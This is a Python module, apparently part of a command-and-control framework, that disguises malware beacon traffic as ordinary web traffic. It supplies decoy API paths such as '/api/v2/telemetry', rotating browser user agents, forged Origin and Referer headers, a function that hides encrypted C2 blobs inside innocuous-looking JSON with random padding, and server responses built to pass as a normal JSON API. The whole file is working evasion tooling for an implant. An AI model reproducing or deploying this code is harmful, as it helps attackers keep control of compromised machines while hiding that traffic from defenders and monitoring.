"""Stealthy HTTP beacon camouflage — paths, headers, JSON wrappers.

Server and client share the same conventions so traffic looks like
ordinary JSON API / analytics posts rather than a bare C2 frame.
"""

from __future__ import annotations

import base64
import os
import random
from typing import Any

# Benign-looking URI pool (client picks one at random per request)
DEFAULT_URIS = [
    "/api/v2/telemetry",
    "/api/v1/events",
    "/api/analytics/collect",
    "/cdn/assets/status.json",
    "/jquery-3.6.0.min.js.map",
    "/.well-known/client-config",
    "/api/session/refresh",
    "/metrics/client",
    "/api/v1/health/detail",
    "/static/js/app.config.json",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
]

# Cookie / header names that look mundane
SESSION_COOKIE = "sid"
DATA_FIELD = "payload"       # outer JSON key holding base64 C2 blob
META_FIELDS = ("ts", "v", "src", "rid")  # decoy keys


def random_uri(uris: list[str] | None = None) -> str:
    return random.choice(uris or DEFAULT_URIS)


def random_ua() -> str:
    return random.choice(USER_AGENTS)


def wrap_c2_blob(blob: bytes, extra: dict[str, Any] | None = None) -> bytes:
    """Hide length-prefixed (or raw encrypted) C2 blob inside innocuous JSON."""
    outer = {
        "v": "2.1.0",
        "ts": int(__import__("time").time() * 1000),
        "src": random.choice(["web", "app", "mobile", "worker"]),
        "rid": base64.urlsafe_b64encode(os.urandom(9)).decode().rstrip("="),
        DATA_FIELD: base64.b64encode(blob).decode(),
    }
    if extra:
        outer.update(extra)
    # optional padding field
    if random.random() < 0.4:
        outer["meta"] = base64.b64encode(os.urandom(random.randint(8, 48))).decode()
    import orjson
    return orjson.dumps(outer)


def unwrap_c2_blob(body: bytes) -> bytes | None:
    """Extract C2 blob from stealth JSON or fall back to raw frame."""
    if not body:
        return None
    # try JSON wrapper
    try:
        import orjson
        obj = orjson.loads(body)
        if isinstance(obj, dict) and DATA_FIELD in obj:
            return base64.b64decode(obj[DATA_FIELD])
        # legacy clear JSON message (no wrapper)
        if isinstance(obj, dict) and "type" in obj:
            return body
    except Exception:
        pass
    # raw length-prefixed frame
    if len(body) >= 4:
        return body
    return None


def build_request_headers(host: str, body_len: int, uri: str, beacon_id: str) -> bytes:
    ua = random_ua()
    lines = [
        f"POST {uri} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        "Accept: application/json, text/plain, */*",
        "Accept-Language: en-US,en;q=0.9",
        "Content-Type: application/json",
        f"Content-Length: {body_len}",
        f"Cookie: {SESSION_COOKIE}={beacon_id}; theme=dark; lang=en",
        "Origin: https://cdn.example-static.net",
        f"Referer: https://cdn.example-static.net/",
        "Connection: close",
        "",
        "",
    ]
    return "\r\n".join(lines).encode()


def build_response(status: int, body: bytes, content_type: str = "application/json") -> bytes:
    reasons = {200: "OK", 204: "No Content", 404: "Not Found", 400: "Bad Request", 500: "Error"}
    reason = reasons.get(status, "OK")
    # Always look like JSON API even when empty
    if status == 204 or not body:
        body = b'{"status":"ok","data":null}'
        status = 200
        reason = "OK"
    headers = (
        f"HTTP/1.1 {status} {reason}\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Cache-Control: no-store\r\n"
        "X-Content-Type-Options: nosniff\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    return headers + body


def path_allowed(path: str, allowlist: list[str] | None = None) -> bool:
    """Accept known stealth URIs or legacy /beacon."""
    path = path.split("?")[0]
    allowed = set(allowlist or DEFAULT_URIS)
    allowed.add("/beacon")  # legacy
    if path in allowed:
        return True
    # prefix match for /api/
    if path.startswith("/api/") or path.startswith("/cdn/") or path.startswith("/static/"):
        return True
    return False
